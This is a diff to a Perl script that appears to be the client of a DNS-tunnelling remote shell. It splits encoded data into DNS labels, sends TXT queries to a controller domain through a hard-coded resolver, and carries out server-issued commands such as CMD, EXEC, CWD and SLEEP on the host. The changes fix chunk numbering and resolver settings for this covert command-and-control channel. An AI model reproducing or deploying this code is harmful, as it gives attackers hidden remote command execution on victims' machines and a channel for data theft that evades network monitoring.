@@ -1,6 +1,6 @@
 ###############################
 # To Do
-# * split/order queries that are > than X bytes
+# * Use local dns server config
 # * Support multiple encoding
 ###############################
 use warnings;
@@ -70,14 +70,15 @@ sub sendQuery{
 	
 	my @chunks = ($msg_encoded =~ /.{1,63}/gs);
 	my $return;
-	for (my $part = 0; $part < $parts; $part++) {
-		debug("PART: $part", "$chunks[$part] (" . length($chunks[$part]) . ")");
+	for (my $part = 1; $part <= $parts; $part++) {
+		debug("PART: $part", "$chunks[$part-1] (" . length($chunks[$part-1]) . ")");
 	
-		my $query = "$chunks[$part].$part.$parts.$cmd.$client_id_encoded.$domain";
+		my $query = "$chunks[$part-1].$part.$parts.$cmd.$client_id_encoded.$domain";
 		if ($debug) {
 			print "QUERY: $query (" . length($query) . ")\n";
 		}
-		my $res = Net::DNS::Resolver->new();
+		#my $res = Net::DNS::Resolver->new(nameservers => [qw(192.168.0.48)]);
+		my $res = Net::DNS::Resolver->new(nameservers=> [qw(75.75.76.76)]);
 		my $answer = $res->query($query, 'TXT');
 		if($answer) {
 			foreach my $rr ($answer->answer) {
@@ -111,6 +112,7 @@ sub shell{
 					debug("CMD", $cmd);
 					$sleep_value = $payload;
 					$exec_rsp = "Sleep set to $payload\n";
+					$client_cmd = "SLEEP";
 				} elsif ($cmd eq "EXEC") {
 					debug("CMD", $cmd);
 				} elsif ($cmd eq "CMD" ) {
@@ -128,6 +130,7 @@ sub shell{
 						$client_cmd = "CMD";
 					}
 				} elsif($cmd eq "CWD") {
+					#if(chdir "$payload") {
 					if(chdir $payload) {
 						$exec_rsp = "COMMAND EXITED WITH: SUCCESS\n";
 					} else {
@@ -137,6 +140,7 @@ sub shell{
 				} elsif ($cmd eq "NULL") {
 					debug("CMD", $cmd);
 					$exec_rsp = "NULL";
+					$client_cmd = "NULL";
 				} else {
 					debug("INVALID CMD", $cmd);
 				}
